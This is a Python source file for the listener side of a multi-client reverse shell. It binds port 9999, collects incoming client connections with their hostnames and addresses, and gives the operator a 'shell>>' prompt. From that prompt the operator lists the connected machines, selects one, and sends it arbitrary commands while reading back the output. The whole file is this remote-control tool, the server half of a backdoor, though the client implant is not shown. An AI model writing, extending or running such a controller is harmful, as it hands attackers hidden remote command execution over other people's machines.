import  socket
import time
import threading
from queue import Queue

host =''
port = 9999
FORMAT ="utf-8"
queue =Queue()
JOB_NUMBER =[1,2]
all_connections=[]
all_addresses=[]


##############################     SARA ALZAMLY   ##############################
def socket_create():
    try:
        global server
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except socket.error as msg:
        print("Socket creation error: "+ str(msg))
##############################

def socket_bind():
    try:
        print("Binding the port: " + str(port))
        server.bind((host,port))
        server.listen(5)
    except socket.error as e:
        print("Socket binding error: " + str(e))
        time.sleep(5)
        socket_bind()
##############################
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn,address =server.accept()
            client_hostname =conn.recv(1024).decode(FORMAT)
        except Exception as e:
            print("Error accepting connections: " + str(e))
            continue
        all_connections.append(conn)
        all_addresses.append(address)
        addresses =str(all_addresses[:][0])
        #print('Connection from {}'.format(client_hostname) )
        print('Connection from {}'.format(client_hostname)+addresses)
##############################
def start_shell():
    while True:
        cmd=input("shell>> ")
        if cmd == "list":
            list_connections()
        if "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_command(conn)
        else:
            print("Command not recognized")
##############################
def list_connections():
    results ="\n"
    for i ,conns in enumerate(all_connections) :
        conns.send(str.encode("  "))
        conns.recv(20480)
        results += str(i)+"  "+ str(all_addresses[i])+"\n"
    print("    ----- Clients -----",results)
##############################
def get_target(cmd):
    try :
        target = cmd.replace("select ", "")
        target = int(target)
        con = all_connections[target]
        #print("connect to " + str(all_address[target]))
        print("connect to ", str(all_addresses[target]))
        print(str(all_addresses[target][0])+ ">",end="")
        return con
    except:
        print("Not valid")
        return None
##############################
def send_target_command(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd))>0 :
                conn.send(str.encode(cmd))
                client_response =str(conn.recv(20480),FORMAT)
                print(client_response,end="")
            if cmd == "quit":
                break

        except:
            print("connection is lost")
            break
##############################
def create_workers():
    for x in range(10):
        t= threading.Thread(target=work)
        t.start()
##############################
def work():
    while True:
        x=queue.get()
        if x==1:
            socket_create()
            socket_bind()
            accept_connections()

        if x==2:
            start_shell()
        queue.task_done()
##############################
def creat_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
##############################

create_workers()
creat_jobs()